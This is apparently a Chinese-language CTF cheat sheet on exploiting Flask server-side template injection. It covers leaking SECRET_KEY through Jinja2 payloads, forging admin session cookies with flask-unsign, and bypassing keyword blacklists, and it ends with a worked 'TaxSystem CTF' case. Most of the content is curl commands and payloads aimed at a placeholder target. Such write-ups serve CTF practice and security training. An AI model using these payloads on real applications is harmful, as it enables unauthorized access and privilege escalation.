# Flask SSTI + Session Forgery Chain

## 场景

Flask应用存在SSTI（服务端模板注入），可通过`render_template_string()`注入Jinja2模板代码。
目标通常是：读取数据库flag、提升权限、RCE。

## 典型攻击链

```
SSTI发现 → 提取SECRET_KEY → 伪造session cookie → 权限提升 → 获取flag
```

## 步骤1: 确认SSTI

```bash
# 基础测试
curl -s "http://target/api?name={{7*7}}"  # 返回49
curl -s "http://target/api?name={{config}}"  # 返回配置对象

# 在POST参数中测试
curl -s -X POST http://target/login -d "username={{7*7}}&password=test"
```

## 步骤2: 提取SECRET_KEY

```jinja2
{{config.SECRET_KEY}}
{{config.items()}}
```

`config`是Jinja2内置对象，不需要`__globals__`或`__class__`等dunder属性，
因此常能绕过简单的黑名单过滤。

## 步骤3: Flask Session Cookie伪造

### 工具: flask-unsign

```bash
pip3 install flask-unsign --break-system-packages

# 解码现有cookie
flask-unsign --decode --cookie "eyJ1c2VyX2lkIjoxfQ.xxx"

# 签名新cookie (v2 legacy, 先试这个)
flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin'}" --secret 'THE_KEY' --legacy

# 签名新cookie (v3 non-legacy, Flask >= 2.x默认)
flask-unsign --sign --cookie "{'user_id': 1, 'role': 'admin'}" --secret 'THE_KEY'
```

### 手动签名 (Python)

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = 'THE_KEY'

serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = serializer.dumps({'user_id': 1, 'role': 'admin'})
```

### 签名版本判断

```bash
# 服务器默认cookie格式 → decode看payload字段顺序
flask-unsign --decode --cookie "$SERVER_COOKIE"

# Flask >= 2.0 使用v3 (non-legacy)
# Flask < 2.0 使用v2 (legacy)
# 服务端Werkzeug版本可从响应头获取
curl -sI http://target/ | grep -i server
```

### 使用伪造cookie

```bash
curl -s -b "session=$FORGED_COOKIE" http://target/admin/flag
```

## 步骤4: SSTI黑名单绕过

### 常见黑名单项

| 被禁 | 绕过思路 |
|------|---------|
| `__` | 无法直接用`__class__`等 |
| `'` `"` | 无法直接构造字符串 |
| `[` `]` | 无法用列表索引 |
| `\|` | 无法用Jinja2过滤器 |
| `+` | 无法拼接字符串 |
| `request` `session` | 无法访问请求对象 |
| `popen` `system` | 无法直接RCE |

### 绕过: config对象 (不需要任何黑名单项)

```jinja2
{{config.SECRET_KEY}}           # 提取密钥
{{config.items()}}              # 遍历所有配置
{{config.DATABASE}}             # 数据库路径
```

### 绕过: 利用已知SECRET_KEY伪造cookie (绕过所有SSTI限制)

SSTI本身可能被严重限制，但只要能提取到SECRET_KEY，
就可以绕过所有限制直接伪造管理员session。

## 步骤5: 数据库读取 (如果需要)

当无法伪造session时，通过SSTI读取SQLite数据库：

```jinja2
# 需要__globals__等，适用于黑名单宽松时
{{().__class__.__bases__[0].__subclasses__()...}}

# 或通过config获取数据库路径，再用SSTI构造读文件payload
```

## 关键判断

| 情况 | 下一步 |
|------|--------|
| config.SECRET_KEY可读 | 伪造session cookie → 权限提升 |
| SECRET_KEY不可读但有RCE | os.popen读取数据库/配置文件 |
| 黑名单很严但有config | 提取密钥 + 伪造cookie |
| 有SQL注入 + SSTI | 通过SQL注入修改密码/role |

## Pitfall: flask-unsign签名版本不匹配

伪造的cookie可能被服务端拒绝，原因是签名版本不匹配。

```bash
# 先试legacy (v2)
COOKIE=$(flask-unsign --sign --cookie "{'user_id':1,'role':'admin'}" --secret 'KEY' --legacy)
curl -s -b "session=$COOKIE" http://target/admin | grep -i "unauthorized\|flag"

# 失败则试non-legacy (v3)
COOKIE=$(flask-unsign --sign --cookie "{'user_id':1,'role':'admin'}" --secret 'KEY')
curl -s -b "session=$COOKIE" http://target/admin | grep -i "unauthorized\|flag"

# 都失败 → 服务端可能用了不同的SECRET_KEY (环境变量覆盖了源码中的默认值)
# 必须通过SSTI提取真实SECRET_KEY
```

## Pitfall: SECRET_KEY被环境变量覆盖

```python
# 源码可能写的
SECRET_KEY = os.environ.get('SECRET_KEY', 'default_key_in_source')

# 服务端实际用的是环境变量的值，不是源码中的默认值
# 所以直接用源码中的key签名的cookie会被拒绝
# 解决: 必须通过SSTI的{{config.SECRET_KEY}}提取真实值
```

## 实战案例: TaxSystem CTF (2026-05)

1. 源码审计发现`/preview/<id>`路由在state=AUDIT_PENDING时将`custom_footer`传入`render_template_string()`
2. 黑名单: `__`, `[]`, `|`, `\`, `+`, `'`, `"`, `request`, `session`, `url_for`, `popen`, `system`
3. 登录admin:123456, 创建profile, 设置state=AUDIT_PENDING + custom_footer=`{{config.SECRET_KEY}}`
4. 预览页面泄露真实SECRET_KEY: `secret_tax_key_2026_xoxo` (源码默认值无效)
5. 伪造session: `flask-unsign --sign --cookie "{'user_id':1,'role':'tax_inspector'}" --secret 'secret_tax_key_2026_xoxo'`
6. 访问`/admin/vault`获取flag
